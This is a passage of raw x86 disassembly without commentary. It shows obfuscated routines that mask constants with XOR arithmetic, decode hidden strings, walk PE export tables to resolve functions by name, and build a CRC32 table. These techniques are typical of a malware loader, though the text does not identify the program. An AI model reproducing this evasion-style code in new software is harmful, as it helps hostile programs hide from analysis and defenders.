  41f69d:	cmp    eax,ecx
  41f69f:	jbe    0x41f6c8
  41f6a1:	mov    eax,DWORD PTR [ebp+0x8]
  41f6a4:	add    eax,DWORD PTR [ebp-0x8]
  41f6a7:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6aa:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ad:	mov    ecx,DWORD PTR [ecx]
  41f6af:	mov    DWORD PTR [eax],ecx
  41f6b1:	mov    eax,DWORD PTR [ebp-0xc]
  41f6b4:	xor    eax,0x751089b
  41f6b9:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6bc:	lea    eax,[ecx+eax*1+0x3272e2]
  41f6c3:	mov    DWORD PTR [ebp-0x8],eax
  41f6c6:	jmp    0x41f723
  41f6c8:	mov    eax,DWORD PTR [ebp+0x10]
  41f6cb:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6ce:	sub    eax,ecx
  41f6d0:	mov    ecx,DWORD PTR [ebp-0x4]
  41f6d3:	xor    ecx,0x751089b
  41f6d9:	add    ecx,0x3272e2
  41f6df:	cmp    eax,ecx
  41f6e1:	jbe    0x41f70c
  41f6e3:	mov    eax,DWORD PTR [ebp+0x8]
  41f6e6:	add    eax,DWORD PTR [ebp-0x8]
  41f6e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6ec:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ef:	mov    cx,WORD PTR [ecx]
  41f6f2:	mov    WORD PTR [eax],cx
  41f6f5:	mov    eax,DWORD PTR [ebp-0x4]
  41f6f8:	xor    eax,0x751089b
  41f6fd:	mov    ecx,DWORD PTR [ebp-0x8]
  41f700:	lea    eax,[ecx+eax*1+0x3272e2]
  41f707:	mov    DWORD PTR [ebp-0x8],eax
  41f70a:	jmp    0x41f723
  41f70c:	mov    eax,DWORD PTR [ebp+0x8]
  41f70f:	add    eax,DWORD PTR [ebp-0x8]
  41f712:	mov    ecx,DWORD PTR [ebp+0xc]
  41f715:	add    ecx,DWORD PTR [ebp-0x8]
  41f718:	mov    cl,BYTE PTR [ecx]
  41f71a:	mov    BYTE PTR [eax],cl
  41f71c:	mov    eax,DWORD PTR [ebp-0x8]
  41f71f:	inc    eax
  41f720:	mov    DWORD PTR [ebp-0x8],eax
  41f723:	jmp    0x41f60c
  41f728:	leave  
  41f729:	ret    0xc
  41f72c:	push   ebp
  41f72d:	mov    ebp,esp
  41f72f:	sub    esp,0xc
  41f732:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f739:	push   esi
  41f73a:	mov    esi,eax
  41f73c:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41f743:	mov    edx,DWORD PTR [ebp-0x4]
  41f746:	mov    eax,0x751089b
  41f74b:	xor    edx,eax
  41f74d:	mov    ecx,0x3272e2
  41f752:	add    edx,ecx
  41f754:	cmp    esi,edx
  41f756:	je     0x41f798
  41f758:	push   ebx
  41f759:	push   edi
  41f75a:	mov    edx,DWORD PTR [ebp-0x8]
  41f75d:	mov    ebx,DWORD PTR [ebp+0x8]
  41f760:	xor    edx,eax
  41f762:	mov    edi,0xffcd8d1e
  41f767:	sub    edi,edx
  41f769:	add    esi,edi
  41f76b:	lea    edx,[esi-0x3272e2]
  41f771:	xor    edx,eax
  41f773:	mov    DWORD PTR [ebp-0xc],edx
  41f776:	mov    edx,DWORD PTR [ebp-0x4]
  41f779:	mov    edi,DWORD PTR [ebp-0xc]
  41f77c:	xor    dl,0x9b
  41f77f:	sub    dl,0x1e
  41f782:	xor    edi,eax
  41f784:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  41f78b:	mov    edx,DWORD PTR [ebp-0x4]
  41f78e:	xor    edx,eax
  41f790:	add    edx,ecx
  41f792:	cmp    esi,edx
  41f794:	jne    0x41f75a
  41f796:	pop    edi
  41f797:	pop    ebx
  41f798:	pop    esi
  41f799:	leave  
  41f79a:	ret    0x4
  41f79d:	push   ebp
  41f79e:	mov    ebp,esp
  41f7a0:	sub    esp,0x21c
  41f7a6:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f7ad:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41f7b4:	mov    eax,DWORD PTR [ebp+0x10]
  41f7b7:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ba:	mov    ecx,DWORD PTR [ebp+0x8]
  41f7bd:	push   esi
  41f7be:	push   edi
  41f7bf:	mov    edi,0x751089b
  41f7c4:	xor    eax,edi
  41f7c6:	mov    esi,0x3272e2
  41f7cb:	add    eax,esi
  41f7cd:	cmp    eax,ecx
  41f7cf:	mov    eax,DWORD PTR [ebp-0x4]
  41f7d2:	jne    0x41f7dd
  41f7d4:	xor    eax,edi
  41f7d6:	add    eax,esi
  41f7d8:	jmp    0x41f889
  41f7dd:	mov    ecx,DWORD PTR [ebp+0xc]
  41f7e0:	xor    eax,edi
  41f7e2:	add    eax,esi
  41f7e4:	cmp    eax,ecx
  41f7e6:	jne    0x41f7ed
  41f7e8:	mov    eax,DWORD PTR [ebp-0x4]
  41f7eb:	jmp    0x41f7d4
  41f7ed:	lea    eax,[ebp-0x21c]
  41f7f3:	mov    DWORD PTR [ebp-0x8],eax
  41f7f6:	mov    eax,DWORD PTR [ebp+0xc]
  41f7f9:	mov    DWORD PTR [ebp-0x10],eax
  41f7fc:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ff:	xor    eax,edi
  41f801:	add    eax,esi
  41f803:	mov    DWORD PTR [ebp+0x10],eax
  41f806:	mov    eax,DWORD PTR [ebp+0xc]
  41f809:	push   ebx
  41f80a:	call   0x41f4e5
  41f80f:	mov    ebx,eax
  41f811:	mov    eax,DWORD PTR [ebp+0x8]
  41f814:	mov    eax,DWORD PTR [eax+0x14]
  41f817:	jmp    0x41f871
  41f819:	mov    eax,DWORD PTR [ebp+0xc]
  41f81c:	sub    eax,0x8
  41f81f:	mov    DWORD PTR [ebp-0xc],eax
  41f822:	mov    eax,DWORD PTR [ebp-0xc]
  41f825:	mov    eax,DWORD PTR [eax+0x28]
  41f828:	call   0x41f3cd
  41f82d:	mov    DWORD PTR [ebp+0x10],eax
  41f830:	push   DWORD PTR [ebp+0x10]
  41f833:	mov    edx,DWORD PTR [ebp-0x8]
  41f836:	call   0x41f574
  41f83b:	mov    eax,DWORD PTR [ebp-0x4]
  41f83e:	xor    eax,edi
  41f840:	add    eax,esi
  41f842:	cmp    eax,ebx
  41f844:	jne    0x41f84e
  41f846:	mov    eax,DWORD PTR [ebp-0x8]
  41f849:	call   0x41f45b
  41f84e:	mov    eax,DWORD PTR [ebp-0x14]
  41f851:	xor    eax,edi
  41f853:	add    eax,esi
  41f855:	push   eax
  41f856:	push   DWORD PTR [ebp-0x10]
  41f859:	mov    eax,DWORD PTR [ebp-0x8]
  41f85c:	call   0x41f187
  41f861:	mov    ecx,DWORD PTR [ebp-0x4]
  41f864:	xor    ecx,edi
  41f866:	add    ecx,esi
  41f868:	cmp    eax,ecx
  41f86a:	je     0x41f88f
  41f86c:	mov    eax,DWORD PTR [ebp+0xc]
  41f86f:	mov    eax,DWORD PTR [eax]
  41f871:	mov    DWORD PTR [ebp+0xc],eax
  41f874:	mov    eax,DWORD PTR [ebp+0x8]
  41f877:	mov    ecx,DWORD PTR [ebp+0xc]
  41f87a:	add    eax,0x14
  41f87d:	cmp    ecx,eax
  41f87f:	jne    0x41f819
  41f881:	mov    eax,DWORD PTR [ebp-0x4]
  41f884:	xor    eax,edi
  41f886:	add    eax,esi
  41f888:	pop    ebx
  41f889:	pop    edi
  41f88a:	pop    esi
  41f88b:	leave  
  41f88c:	ret    0xc
  41f88f:	mov    eax,DWORD PTR [ebp-0xc]
  41f892:	mov    eax,DWORD PTR [eax+0x18]
  41f895:	jmp    0x41f888
  41f897:	push   ebp
  41f898:	mov    ebp,esp
  41f89a:	mov    eax,DWORD PTR [ebp+0xc]
  41f89d:	sub    esp,0x10
  41f8a0:	cmp    DWORD PTR [ebp+0x8],0x0
  41f8a4:	push   ebx
  41f8a5:	push   esi
  41f8a6:	push   edi
  41f8a7:	je     0x41f95c
  41f8ad:	test   eax,eax
  41f8af:	je     0x41f95c
  41f8b5:	movzx  eax,WORD PTR [eax+0x20]
  41f8b9:	mov    ecx,eax
  41f8bb:	mov    DWORD PTR [ebp-0x10],eax
  41f8be:	xor    edx,edx
  41f8c0:	and    DWORD PTR [ebp-0x8],edx
  41f8c3:	mov    eax,0x8a8d
  41f8c8:	xor    ecx,eax
  41f8ca:	add    ecx,0x3b51
  41f8d0:	mov    DWORD PTR [ebp-0xc],ecx
  41f8d3:	and    DWORD PTR [ebp-0x4],0x0
  41f8d7:	xor    ecx,ecx
  41f8d9:	push   0x7e
  41f8db:	pop    edi
  41f8dc:	cmp    cx,WORD PTR [ebp-0xc]
  41f8e0:	jae    0x41f946
  41f8e2:	lea    esi,[edx-0x3b51]
  41f8e8:	xor    esi,eax
  41f8ea:	movzx  ecx,WORD PTR [ebp-0x4]
  41f8ee:	mov    ebx,DWORD PTR [ebp+0xc]
  41f8f1:	lea    ecx,[ebx+ecx*4]
  41f8f4:	cmp    WORD PTR [ecx+0x2],si
  41f8f8:	jne    0x41f931
  41f8fa:	movzx  ecx,WORD PTR [ecx]
  41f8fd:	mov    edi,0x4e22
  41f902:	cmp    cx,di
  41f905:	jne    0x41f913
  41f907:	mov    ebx,DWORD PTR [ebp+0x8]
  41f90a:	movzx  edi,dx
  41f90d:	cmp    BYTE PTR [edi+ebx*1],0x0
  41f911:	je     0x41f940
  41f913:	mov    ebx,DWORD PTR [ebp+0x8]
  41f916:	movzx  edi,dx
  41f919:	movsx  di,BYTE PTR [edi+ebx*1]
  41f91e:	mov    ebx,0x3b51
  41f923:	sub    di,bx
  41f926:	xor    di,ax
  41f929:	cmp    cx,di
  41f92c:	je     0x41f940
  41f92e:	push   0x7c
  41f930:	pop    edi
  41f931:	inc    DWORD PTR [ebp-0x4]
  41f934:	mov    cx,WORD PTR [ebp-0xc]
  41f938:	cmp    WORD PTR [ebp-0x4],cx
  41f93c:	jb     0x41f8ea
  41f93e:	jmp    0x41f946
  41f940:	inc    DWORD PTR [ebp-0x8]
  41f943:	push   0x7d
  41f945:	pop    edi
  41f946:	mov    esi,DWORD PTR [ebp+0x8]
  41f949:	movzx  ecx,dx
  41f94c:	cmp    BYTE PTR [ecx+esi*1],0x0
  41f950:	je     0x41f965
  41f952:	inc    edx
  41f953:	cmp    edi,0x7c
  41f956:	jne    0x41f8d3
  41f95c:	xor    eax,eax
  41f95e:	pop    edi
  41f95f:	pop    esi
  41f960:	pop    ebx
  41f961:	leave  
  41f962:	ret    0x8
  41f965:	mov    ecx,DWORD PTR [ebp-0x8]
  41f968:	add    ecx,0xffffc4af
  41f96e:	xor    cx,ax
  41f971:	xor    eax,eax
  41f973:	cmp    cx,WORD PTR [ebp-0x10]
  41f977:	sete   al
  41f97a:	jmp    0x41f95e
  41f97c:	push   ebp
  41f97d:	mov    ebp,esp
  41f97f:	sub    esp,0x50
  41f982:	push   edi
  41f983:	mov    edi,eax
  41f985:	mov    eax,DWORD PTR [edi+0x1a8]
  41f98b:	cmp    DWORD PTR [eax],0x0
  41f98e:	jne    0x41f997
  41f990:	xor    eax,eax
  41f992:	jmp    0x41fac8
  41f997:	push   DWORD PTR [ebp+0x8]
  41f99a:	push   0x2c
  41f99c:	pop    eax
  41f99d:	call   0x41f72c
  41f9a2:	mov    edx,DWORD PTR [edi+0x1ac]
  41f9a8:	lea    eax,[edi+0x22]
  41f9ab:	mov    DWORD PTR [ebp-0x4c],eax
  41f9ae:	lea    eax,[edi+0x44]
  41f9b1:	mov    DWORD PTR [ebp-0x48],eax
  41f9b4:	lea    eax,[edi+0x66]
  41f9b7:	mov    DWORD PTR [ebp-0x44],eax
  41f9ba:	lea    eax,[edi+0x88]
  41f9c0:	mov    DWORD PTR [ebp-0x40],eax
  41f9c3:	lea    eax,[edi+0xaa]
  41f9c9:	mov    DWORD PTR [ebp-0x3c],eax
  41f9cc:	lea    eax,[edi+0xcc]
  41f9d2:	mov    DWORD PTR [ebp-0x38],eax
  41f9d5:	lea    eax,[edi+0xee]
  41f9db:	mov    DWORD PTR [ebp-0x34],eax
  41f9de:	lea    eax,[edi+0x110]
  41f9e4:	mov    DWORD PTR [ebp-0x30],eax
  41f9e7:	lea    eax,[edi+0x132]
  41f9ed:	mov    DWORD PTR [ebp-0x2c],eax
  41f9f0:	lea    eax,[edi+0x154]
  41f9f6:	push   edi
  41f9f7:	mov    DWORD PTR [ebp-0x50],edi
  41f9fa:	mov    DWORD PTR [ebp-0x28],eax
  41f9fd:	call   0x41fafc
  41fa02:	push   eax
  41fa03:	mov    eax,DWORD PTR [edi+0x1a8]
  41fa09:	push   DWORD PTR [eax]
  41fa0b:	call   0x41f79d
  41fa10:	mov    DWORD PTR [ebp-0x10],eax
  41fa13:	test   eax,eax
  41fa15:	je     0x41fac8
  41fa1b:	mov    ecx,DWORD PTR [eax+0x3c]
  41fa1e:	push   ebx
  41fa1f:	push   esi
  41fa20:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41fa24:	add    esi,eax
  41fa26:	mov    edi,DWORD PTR [esi+0x24]
  41fa29:	mov    ecx,DWORD PTR [esi+0x1c]
  41fa2c:	mov    edx,DWORD PTR [esi+0x20]
  41fa2f:	mov    ebx,DWORD PTR [esi+0x18]
  41fa32:	add    edi,eax
  41fa34:	mov    DWORD PTR [ebp-0x20],edi
  41fa37:	mov    edi,DWORD PTR [esi+0x14]
  41fa3a:	add    ecx,eax
  41fa3c:	add    edx,eax
  41fa3e:	mov    DWORD PTR [ebp-0xc],ecx
  41fa41:	mov    DWORD PTR [ebp-0x1c],edx
  41fa44:	mov    DWORD PTR [ebp-0x8],edi
  41fa47:	cmp    edi,ebx
  41fa49:	ja     0x41fa4e
  41fa4b:	mov    DWORD PTR [ebp-0x8],ebx
  41fa4e:	xor    ebx,ebx
  41fa50:	mov    DWORD PTR [ebp-0x18],ebx
  41fa53:	cmp    DWORD PTR [ebp-0x8],ebx
  41fa56:	jbe    0x41fac6
  41fa58:	jmp    0x41fa5d
  41fa5a:	mov    edx,DWORD PTR [ebp-0x1c]
  41fa5d:	mov    edi,DWORD PTR [ebp-0x20]
  41fa60:	movzx  edi,WORD PTR [edi+ebx*2]
  41fa64:	cmp    ebx,DWORD PTR [esi+0x18]
  41fa67:	jae    0x41fac6
  41fa69:	cmp    edi,DWORD PTR [esi+0x14]
  41fa6c:	jae    0x41fac6
  41fa6e:	mov    ebx,DWORD PTR [edx+ebx*4]
  41fa71:	mov    edx,DWORD PTR [ebp+0x8]
  41fa74:	mov    edi,DWORD PTR [ecx+edi*4]
  41fa77:	mov    DWORD PTR [ebp-0x4],edx
  41fa7a:	lea    edx,[ebp-0x50]
  41fa7d:	add    ebx,eax
  41fa7f:	add    edi,eax
  41fa81:	sub    edx,DWORD PTR [ebp+0x8]
  41fa84:	mov    DWORD PTR [ebp-0x14],0xb
  41fa8b:	mov    DWORD PTR [ebp-0x24],edx
  41fa8e:	mov    edx,DWORD PTR [ebp-0x4]
  41fa91:	cmp    DWORD PTR [edx],0x0
  41fa94:	jne    0x41fab1
  41fa96:	mov    eax,DWORD PTR [ebp-0x24]
  41fa99:	push   DWORD PTR [eax+edx*1]
  41fa9c:	push   ebx
  41fa9d:	call   0x41f897
  41faa2:	mov    ecx,DWORD PTR [ebp-0xc]
  41faa5:	test   eax,eax
  41faa7:	je     0x41faae
  41faa9:	mov    eax,DWORD PTR [ebp-0x4]
  41faac:	mov    DWORD PTR [eax],edi
  41faae:	mov    eax,DWORD PTR [ebp-0x10]
  41fab1:	add    DWORD PTR [ebp-0x4],0x4
  41fab5:	dec    DWORD PTR [ebp-0x14]
  41fab8:	jne    0x41fa8e
  41faba:	mov    ebx,DWORD PTR [ebp-0x18]
  41fabd:	inc    ebx
  41fabe:	mov    DWORD PTR [ebp-0x18],ebx
  41fac1:	cmp    ebx,DWORD PTR [ebp-0x8]
  41fac4:	jb     0x41fa5a
  41fac6:	pop    esi
  41fac7:	pop    ebx
  41fac8:	pop    edi
  41fac9:	leave  
  41faca:	ret    0x4
  41facd:	push   ebp
  41face:	mov    ebp,esp
  41fad0:	mov    eax,DWORD PTR [ebp+0x8]
  41fad3:	push   esi
  41fad4:	push   DWORD PTR [eax+0x1d8]
  41fada:	lea    esi,[eax+0x198]
  41fae0:	mov    eax,DWORD PTR [ebp+0x8]
  41fae3:	call   0x41f97c
  41fae8:	mov    ecx,DWORD PTR [esi]
  41faea:	mov    DWORD PTR [ecx],eax
  41faec:	mov    eax,DWORD PTR [esi]
  41faee:	xor    ecx,ecx
  41faf0:	cmp    DWORD PTR [eax],ecx
  41faf2:	pop    esi
  41faf3:	setne  cl
  41faf6:	mov    eax,ecx
  41faf8:	pop    ebp
  41faf9:	ret    0x4
  41fafc:	mov    ecx,DWORD PTR [edi+0x188]
  41fb02:	push   ebx
  41fb03:	jmp    0x41fb18
  41fb05:	xor    eax,0x8a8d
  41fb0a:	add    eax,0x3b51
  41fb0f:	mov    WORD PTR [ecx],ax
  41fb12:	add    ecx,0x2
  41fb15:	add    edx,0x2
  41fb18:	movzx  eax,WORD PTR [edx]
  41fb1b:	mov    ebx,0x4e22
  41fb20:	cmp    ax,bx
  41fb23:	jne    0x41fb05
  41fb25:	xor    eax,eax
  41fb27:	mov    WORD PTR [ecx],ax
  41fb2a:	mov    eax,DWORD PTR [edi+0x188]
  41fb30:	pop    ebx
  41fb31:	ret    
  41fb32:	push   edi
  41fb33:	mov    edi,eax
  41fb35:	mov    eax,DWORD PTR [esi+0x188]
  41fb3b:	shl    edi,0x6
  41fb3e:	add    eax,edi
  41fb40:	jmp    0x41fb4c
  41fb42:	xor    cl,0x74
  41fb45:	sub    cl,0x8
  41fb48:	mov    BYTE PTR [eax],cl
  41fb4a:	inc    eax
  41fb4b:	inc    edx
  41fb4c:	mov    cl,BYTE PTR [edx]
  41fb4e:	cmp    cl,0x7c
  41fb51:	jne    0x41fb42
  41fb53:	mov    BYTE PTR [eax],0x0
  41fb56:	mov    eax,DWORD PTR [esi+0x188]
  41fb5c:	add    eax,edi
  41fb5e:	pop    edi
  41fb5f:	ret    
  41fb60:	push   ebp
  41fb61:	mov    ebp,esp
  41fb63:	sub    esp,0x38
  41fb66:	push   ebx
  41fb67:	mov    ebx,0xf89c8585
  41fb6c:	mov    DWORD PTR [ebp-0x4],ebx
  41fb6f:	lea    eax,[ebx-0x1]
  41fb72:	push   esi
  41fb73:	mov    DWORD PTR [ebp-0x24],eax
  41fb76:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb79:	mov    edx,DWORD PTR [ebp+0x8]
  41fb7c:	mov    esi,0x751089b
  41fb81:	push   edi
  41fb82:	xor    ecx,esi
  41fb84:	mov    edi,0x3272e2
  41fb89:	add    ecx,edi
  41fb8b:	cmp    edx,ecx
  41fb8d:	je     0x41fcfb
  41fb93:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb96:	mov    edx,DWORD PTR [ebp+0xc]
  41fb99:	xor    ecx,esi
  41fb9b:	add    ecx,edi
  41fb9d:	cmp    edx,ecx
  41fb9f:	je     0x41fcfb
  41fba5:	mov    ecx,DWORD PTR [ebp+0x10]
  41fba8:	mov    DWORD PTR [ebp-0x18],ecx
  41fbab:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbae:	mov    DWORD PTR [ebp-0x14],ecx
  41fbb1:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbb4:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  41fbbb:	mov    DWORD PTR [ebp-0x20],eax
  41fbbe:	mov    DWORD PTR [ebp-0x10],ebx
  41fbc1:	mov    DWORD PTR [ebp+0xc],eax
  41fbc4:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  41fbcb:	mov    eax,DWORD PTR [ebp+0xc]
  41fbce:	mov    DWORD PTR [ebp-0xc],ecx
  41fbd1:	xor    eax,esi
  41fbd3:	mov    ecx,0xffcd8d1e
  41fbd8:	sub    ecx,eax
  41fbda:	add    ecx,DWORD PTR [ebp-0x14]
  41fbdd:	mov    DWORD PTR [ebp+0x8],ecx
  41fbe0:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41fbe7:	jmp    0x41fceb
  41fbec:	mov    eax,DWORD PTR [ebp+0xc]
  41fbef:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbf2:	xor    eax,esi
  41fbf4:	xor    ecx,esi
  41fbf6:	lea    ecx,[eax+ecx*1+0x64e5c4]
  41fbfd:	mov    eax,DWORD PTR [ebp+0x8]
  41fc00:	xor    edx,edx
  41fc02:	div    ecx
  41fc04:	mov    eax,DWORD PTR [ebp+0x10]
  41fc07:	mov    ecx,DWORD PTR [ebp+0xc]
  41fc0a:	xor    eax,esi
  41fc0c:	xor    ecx,esi
  41fc0e:	sub    eax,ecx
  41fc10:	cmp    edx,eax
  41fc12:	jne    0x41fca7
  41fc18:	mov    eax,DWORD PTR [ebp+0x8]
  41fc1b:	add    eax,DWORD PTR [ebp-0xc]
  41fc1e:	mov    dl,BYTE PTR [eax]
  41fc20:	mov    eax,DWORD PTR [ebp-0x10]
  41fc23:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc26:	xor    eax,esi
  41fc28:	xor    ecx,esi
  41fc2a:	add    eax,edi
  41fc2c:	add    ecx,edi
  41fc2e:	cmp    eax,ecx
  41fc30:	jae    0x41fc78
  41fc32:	lea    ecx,[eax-0x3272e2]
  41fc38:	mov    DWORD PTR [ebp-0x4],ecx
  41fc3b:	mov    ebx,DWORD PTR [ebp-0x4]
  41fc3e:	xor    ebx,esi
  41fc40:	add    ebx,0x7f55d8fb
  41fc46:	lea    ecx,[ebp+eax*4-0x38]
  41fc4a:	mov    DWORD PTR [ecx],ebx
  41fc4c:	mov    ebx,DWORD PTR [ecx]
  41fc4e:	cmp    ebx,0x244ecbda
  41fc54:	jbe    0x41fc5e
  41fc56:	add    DWORD PTR [ecx],0x405fc19
  41fc5c:	jmp    0x41fc64
  41fc5e:	add    DWORD PTR [ecx],0xfdaf43e7
  41fc64:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc67:	xor    ecx,esi
  41fc69:	inc    eax
  41fc6a:	inc    DWORD PTR [ebp-0x4]
  41fc6d:	add    ecx,edi
  41fc6f:	cmp    eax,ecx
  41fc71:	jb     0x41fc3b
  41fc73:	mov    ebx,0xf89c8585
  41fc78:	mov    eax,DWORD PTR [ebp-0x18]
  41fc7b:	test   eax,eax
  41fc7d:	jne    0x41fc87
  41fc7f:	xor    dl,0x74
  41fc82:	sub    dl,0x8
  41fc85:	jmp    0x41fc9d
  41fc87:	mov    eax,DWORD PTR [ebp-0x1c]
  41fc8a:	xor    al,0x9b
  41fc8c:	mov    cl,0x1e
  41fc8e:	sub    cl,al
  41fc90:	add    dl,cl
  41fc92:	mov    ecx,DWORD PTR [ebp-0x20]
  41fc95:	xor    cl,0x9b
  41fc98:	sub    cl,0x1e
  41fc9b:	ror    dl,cl
  41fc9d:	xor    eax,eax
  41fc9f:	mov    eax,DWORD PTR [ebp+0x8]
  41fca2:	add    eax,DWORD PTR [ebp-0xc]
  41fca5:	mov    BYTE PTR [eax],dl
  41fca7:	mov    eax,DWORD PTR [ebp+0x8]
  41fcaa:	mov    ecx,DWORD PTR [ebp-0x10]
  41fcad:	sub    eax,edi
  41fcaf:	xor    eax,esi
  41fcb1:	cmp    eax,ecx
  41fcb3:	jne    0x41fcd9
  41fcb5:	mov    eax,DWORD PTR [ebp+0x10]
  41fcb8:	mov    ecx,DWORD PTR [ebp+0xc]
  41fcbb:	xor    eax,esi
  41fcbd:	xor    ecx,esi
  41fcbf:	sub    eax,ecx
  41fcc1:	sub    eax,edi
  41fcc3:	xor    eax,esi
  41fcc5:	mov    DWORD PTR [ebp+0x10],eax
  41fcc8:	mov    eax,DWORD PTR [ebp+0xc]
  41fccb:	xor    eax,esi
  41fccd:	mov    ecx,0xffcd8d1e
  41fcd2:	sub    ecx,eax
  41fcd4:	add    ecx,DWORD PTR [ebp-0x14]
  41fcd7:	jmp    0x41fce8
  41fcd9:	mov    eax,DWORD PTR [ebp+0xc]
  41fcdc:	xor    eax,esi
  41fcde:	mov    ecx,0xffcd8d1e
  41fce3:	sub    ecx,eax
  41fce5:	add    ecx,DWORD PTR [ebp+0x8]
  41fce8:	mov    DWORD PTR [ebp+0x8],ecx
  41fceb:	mov    eax,DWORD PTR [ebp+0x10]
  41fcee:	cmp    eax,ebx
  41fcf0:	jne    0x41fbec
  41fcf6:	mov    eax,DWORD PTR [ebp-0x24]
  41fcf9:	jmp    0x41fcfe
  41fcfb:	mov    eax,DWORD PTR [ebp-0x4]
  41fcfe:	xor    eax,esi
  41fd00:	add    eax,edi
  41fd02:	pop    edi
  41fd03:	pop    esi
  41fd04:	pop    ebx
  41fd05:	leave  
  41fd06:	ret    0xc
  41fd09:	push   ebp
  41fd0a:	mov    ebp,esp
  41fd0c:	sub    esp,0x14
  41fd0f:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41fd16:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  41fd1d:	mov    eax,DWORD PTR [ebx]
  41fd1f:	mov    DWORD PTR [ebp-0x8],eax
  41fd22:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  41fd29:	push   esi
  41fd2a:	push   edi
  41fd2b:	mov    DWORD PTR [ebp-0x14],0xead718a5
  41fd32:	mov    edi,DWORD PTR [ebp-0x4]
  41fd35:	mov    ecx,DWORD PTR [ebp-0x10]
  41fd38:	mov    eax,0x751089b
  41fd3d:	xor    edi,eax
  41fd3f:	mov    edx,0x3272e2
  41fd44:	xor    ecx,eax
  41fd46:	add    edi,edx
  41fd48:	add    ecx,edx
  41fd4a:	imul   edi,ecx
  41fd4d:	jmp    0x41fd95
  41fd4f:	mov    ecx,DWORD PTR [ebp-0x8]
  41fd52:	mov    esi,DWORD PTR [ebp-0x4]
  41fd55:	xor    ecx,eax
  41fd57:	xor    esi,eax
  41fd59:	add    ecx,edx
  41fd5b:	add    esi,edx
  41fd5d:	test   esi,ecx
  41fd5f:	mov    esi,DWORD PTR [ebp-0x8]
  41fd62:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd65:	je     0x41fd7c
  41fd67:	xor    ecx,eax
  41fd69:	xor    esi,eax
  41fd6b:	add    ecx,edx
  41fd6d:	add    esi,edx
  41fd6f:	shr    esi,cl
  41fd71:	mov    ecx,DWORD PTR [ebp-0x14]
  41fd74:	xor    ecx,eax
  41fd76:	add    ecx,edx
  41fd78:	xor    esi,ecx
  41fd7a:	jmp    0x41fd86
  41fd7c:	xor    esi,eax
  41fd7e:	xor    ecx,eax
  41fd80:	add    esi,edx
  41fd82:	add    ecx,edx
  41fd84:	shr    esi,cl
  41fd86:	mov    DWORD PTR [ebp-0x8],esi
  41fd89:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd8c:	xor    ecx,eax
  41fd8e:	lea    edi,[edi+ecx*1+0x3272e2]
  41fd95:	mov    ecx,DWORD PTR [ebp-0xc]
  41fd98:	mov    esi,DWORD PTR [ebp-0x4]
  41fd9b:	xor    esi,eax
  41fd9d:	xor    ecx,eax
  41fd9f:	sub    ecx,esi
  41fda1:	cmp    edi,ecx
  41fda3:	jbe    0x41fd4f
  41fda5:	mov    eax,DWORD PTR [ebp-0x8]
  41fda8:	pop    edi
  41fda9:	mov    DWORD PTR [ebx],eax
  41fdab:	mov    eax,DWORD PTR [ebp-0x8]
  41fdae:	pop    esi
  41fdaf:	leave  
  41fdb0:	ret    
  41fdb1:	push   ebp
  41fdb2:	mov    ebp,esp
  41fdb4:	sub    esp,0x420
  41fdba:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41fdc1:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41fdc8:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  41fdcf:	push   ebx
  41fdd0:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41fdd7:	mov    eax,DWORD PTR [ebp-0x14]
  41fdda:	push   esi
  41fddb:	mov    esi,0x751089b
  41fde0:	push   edi
  41fde1:	xor    eax,esi
  41fde3:	mov    edi,0x3272e2
  41fde8:	add    eax,edi
  41fdea:	mov    DWORD PTR [ebp-0x8],eax
  41fded:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41fdf4:	mov    DWORD PTR [ebp-0x4],0xead718a5
  41fdfb:	mov    DWORD PTR [ebp-0x10],0x8
  41fe02:	mov    ecx,ecx
  41fe04:	mov    eax,DWORD PTR [ebp-0xc]
  41fe07:	mov    ecx,DWORD PTR [ebp-0x14]
  41fe0a:	xor    eax,esi
  41fe0c:	xor    ecx,esi
  41fe0e:	add    eax,edi
  41fe10:	add    ecx,edi
  41fe12:	imul   eax,ecx
  41fe15:	jmp    0x41fe48
  41fe17:	mov    eax,DWORD PTR [ebp-0x4]
  41fe1a:	sub    eax,edi
  41fe1c:	xor    eax,esi
  41fe1e:	mov    DWORD PTR [ebp-0x8],eax
  41fe21:	lea    ebx,[ebp-0x8]
  41fe24:	call   0x41fd09
  41fe29:	mov    DWORD PTR [ebp-0x8],eax
  41fe2c:	mov    eax,DWORD PTR [ebp-0x8]
  41fe2f:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe32:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  41fe39:	mov    eax,DWORD PTR [ebp-0xc]
  41fe3c:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe3f:	xor    eax,esi
  41fe41:	lea    eax,[eax+ecx*1+0x3272e2]
  41fe48:	mov    DWORD PTR [ebp-0x4],eax
  41fe4b:	mov    eax,DWORD PTR [ebp-0x18]
